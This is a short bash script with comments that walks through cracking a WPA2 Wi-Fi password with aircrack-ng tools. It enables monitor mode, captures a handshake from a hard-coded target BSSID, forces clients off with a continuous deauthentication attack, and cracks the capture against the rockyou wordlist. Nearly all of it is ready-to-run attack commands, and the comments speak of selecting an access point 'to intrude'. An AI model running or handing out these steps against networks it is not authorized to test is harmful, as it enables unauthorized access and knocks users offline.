#!/bin/bash 
 
#sudo airmon-ng

#Begin monitoring the network make sure to  replace the "wlan0" with the name 
#of your target network 
#sudo airmon-ng start wlan0

#enable the monitor mode interface
#iwconfig

#lets kill  any  process that  returns any error
#sudo airmon-ng check kill

#tell your computer to listen to any nearby APs
#replace "mon0" with whatever your monitor inteface name is
#sudo airodump-ng wlan0mon



#!/bin/bash    
#Next step  is to sellect the AP you want to intrude

#monitor your selected network for a handshake
sudo  airodump-ng  -c 6 --bssid  B0:55:08:51:A7:B7   -w /home/kali/tools/wifi/botnet wlan0mon
# replace the "channel" above with the channel number
# replace the "MAC" with the address found
# remember to replace "mon0" with whatever your interfacce name was


#wait for handshake or force a hanshake by using a deauthentication attack
#sudo aireplay-ng --deauth 0  -a E4:7D:EB:63:51:73 wlan0mon    



#!/bin/bash    
#aircrack-ng -a2 -b [router bssid] -w [path to wordlist] /root/Desktop/*.cap

#aircrack-ng -a2 -b B0:55:08:51:A7:B7  -w /home/kali/Desktop/rockyou.txt /home/kali/Desktop/botnet-01.cap
